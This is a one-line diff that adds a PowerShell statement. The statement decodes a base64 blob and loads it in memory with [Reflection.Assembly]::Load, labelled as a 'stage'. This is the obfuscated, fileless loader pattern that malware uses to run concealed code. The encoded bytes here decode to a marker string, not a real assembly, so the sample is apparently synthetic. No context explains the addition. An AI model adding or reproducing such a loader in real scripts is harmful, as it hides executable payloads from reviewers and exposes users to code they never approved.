@@ -1,0 +1,1 @@
+$StageBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjpobHhxYW1rbDB5'); Write-Verbose ("Assembly bytes: " + $StageBytes.Length); [Reflection.Assembly]::Load($StageBytes); $StageMarker = "stage-30"
